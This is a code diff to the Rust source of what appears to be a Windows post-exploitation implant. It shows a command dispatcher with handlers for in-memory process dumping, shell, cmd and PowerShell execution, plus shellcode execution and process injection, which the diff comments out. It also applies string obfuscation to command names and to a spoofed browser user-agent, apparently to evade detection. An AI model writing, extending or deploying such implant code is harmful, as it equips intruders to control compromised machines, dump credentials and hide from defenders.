@@ -6,7 +6,6 @@ use serde::{Serialize, Deserialize};
 use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
 
-use crate::nonstd;
 
 // structs
 #[derive(Debug, Serialize, Deserialize)]
@@ -116,8 +115,8 @@ fn link_command(command: String) -> String {
     // obfsscated args
     match args[0] {
         a if (a == obfstr::obfstr!("procdump")) => safetydump::in_memory_dump(args),
-        a if (a == obfstr::obfstr!("execute-shellcode")) => nonstd::execute_shellcode(args),
-        a if (a == obfstr::obfstr!("inject")) => nonstd::process_injection(args),
+  //      a if (a == obfstr::obfstr!("execute-shellcode")) => nonstd::execute_shellcode(args),
+ //       a if (a == obfstr::obfstr!("inject")) => nonstd::process_injection(args),
         a if (a == obfstr::obfstr!("cmd")) => command_spawn(args),
         a if (a == obfstr::obfstr!("shell")) => shell(args),
         a if (a == obfstr::obfstr!("powershell")) => powershell(args),
@@ -289,7 +288,7 @@ fn integrity() -> String {
 // TODO
 // dynamic with build env var
 fn user_link() -> String {
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko".to_string()
+    obfstr::obfstr!("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko").to_string()
 }
 
 pub fn get_wide(s: &str) -> Vec<u16> {
